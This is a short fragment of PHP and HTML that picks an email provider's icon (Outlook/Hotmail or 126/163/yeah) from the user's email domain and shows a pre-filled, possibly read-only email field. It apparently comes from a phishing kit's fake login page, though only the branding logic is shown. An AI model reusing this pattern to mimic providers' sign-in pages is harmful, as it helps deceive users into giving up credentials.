...
elseif (stripos($domain, 'office') !== false || stripos($domain, 'live') !== false || stripos($domain, 'hotmail') !== false){$image = "ico/hm.ico";}

elseif (stripos($domain, '126') !== false || stripos($domain, '163') !== false || stripos($domain, 'yeah') !== false){$image = "ico/16y.ico";}
...
<br>
<p><img src="<?php echo $image;?>" width="32px" height="32px" onerror="this.src='ico/default.png'""><input id="em" name="em" type="email" required value="<?php echo $eadd; ?>" <?php echo $read; ?> placeholder="example@email.com" style="<?php echo $style; ?>"/>
